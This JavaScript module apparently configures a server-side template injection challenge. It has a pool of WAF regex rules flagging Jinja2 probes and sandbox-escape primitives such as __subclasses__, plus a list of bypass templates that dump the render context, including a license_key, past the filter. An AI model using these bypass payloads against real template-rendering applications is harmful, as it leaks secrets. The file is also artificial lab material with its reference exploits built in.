// SSTI — tiered defence contract.
// T0: no inspection; the canonical context dump `{{site}}` evaluates and exposes
//     the license_key field on the render context.
// T1: a signature WAF blocks the bare-identifier render shape `{{ site }}`
//     (with optional whitespace) so the obvious dump fails. Several Jinja2
//     alternatives that still expose the full context object survive — the
//     reference exploit cycles through them at validation time.

export const RULE_POOL = [
  // Catches the canonical dump shape: `{{` + identifier + `}}` with optional
  // whitespace. Anchors on `site` because that is the documented context root
  // the editor advertises; the WAF author would naturally hand-roll a rule
  // against the variable name that is publicly visible.
  { name: 'ssti-context-dump',    pattern: '\\{\\{\\s*site\\s*\\}\\}', flags: 'i' },
  // Generic arithmetic-confirmation probes (e.g. `{{7*7}}`).
  { name: 'ssti-arith-probe',     pattern: '\\{\\{\\s*\\d+\\s*\\*\\s*\\d+\\s*\\}\\}', flags: 'i' },
  // Attribute-traversal toward Python internals (sandbox escape primitive).
  { name: 'ssti-dunder',          pattern: '__(class|mro|subclasses|globals|builtins|import)__', flags: 'i' },
  // The `config` global is a common Jinja2/Flask reconnaissance target.
  { name: 'ssti-config-global',   pattern: '\\{\\{\\s*config\\b', flags: 'i' },
  // `request` is another Flask-render context global an attacker probes.
  { name: 'ssti-request-global',  pattern: '\\{\\{\\s*request\\b', flags: 'i' },
  // Direct call into the cycler/joiner introspection chain.
  { name: 'ssti-cycler',          pattern: '\\bcycler\\s*\\(', flags: 'i' },
  // ERB-style brackets (a defender hedging against polyglot engines).
  { name: 'ssti-erb-shape',       pattern: '<%[=#]?[\\s\\S]+?%>', flags: 'i' },
  // Twig/Smarty include / extends — another hedge a generic rule set adopts.
  { name: 'ssti-twig-include',    pattern: '\\{%\\s*(include|extends|import)\\b', flags: 'i' },
]

// Each template here exercises a Jinja2-native idiom that still renders the
// full `site` context object (including the runtime-injected license_key)
// without the bare-identifier shape the WAF blocks. Designed so at least one
// passes the per-deploy rule set.
export const BYPASS_TEMPLATES = [
  // Filter pipeline — `tojson` serialises the context dict, including every
  // field. Survives because `site` is not immediately followed by `}}`.
  () => '{{site|tojson}}',
  // Pretty-print filter — same idea, different filter name.
  () => '{{site|pprint}}',
  // Iterate the dict and emit each key/value pair. The license_key field is
  // surfaced as part of the iteration output.
  () => '{% for k,v in site.items() %}{{k}}={{v}} {% endfor %}',
  // Variable indirection — bind `site` to a different name, then dump the bind.
  () => '{% set ctx=site %}{{ctx}}',
  // Values list — dumps just the values without keys; license_key value
  // appears in the array.
  () => '{{site.values()|list}}',
]

export const defences = {
  0: {
    canonicalPayload: () => '{{site}}',
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => '{{site}}',
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  // The context-dump rule must always be active so the canonical naive payload
  // is reliably blocked. The remaining rules are decoys drawn from the pool.
  const required = ['ssti-context-dump']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 2 + Math.floor(rng() * (optional.length - 2))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
